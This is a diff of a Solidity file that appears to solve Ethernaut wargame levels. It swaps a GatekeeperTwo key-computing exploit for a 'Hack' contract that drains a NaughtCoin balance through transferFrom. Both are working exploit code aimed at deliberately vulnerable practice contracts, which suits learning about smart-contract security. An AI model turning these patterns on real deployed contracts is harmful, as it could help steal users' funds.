@@ -1,13 +1,25 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-interface IGatekeeperTwo {
-    function enter(bytes8 _gateKey) external returns (bool);
+interface INaughtCoin {
+    function balanceOf(address account) external returns (uint256);
+
+    function transferFrom(
+        address _from,
+        address _to,
+        uint256 _value
+    ) external returns (bool success);
 }
 
 contract Hack {
+    INaughtCoin naught;
+
     constructor(address contractAddress) {
-        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
-        IGatekeeperTwo(contractAddress).enter(key);
+        naught = INaughtCoin(contractAddress);
+    }
+
+    function attack() public {
+        uint256 balance = naught.balanceOf(msg.sender);
+        naught.transferFrom(msg.sender, address(this), balance);
     }
 }
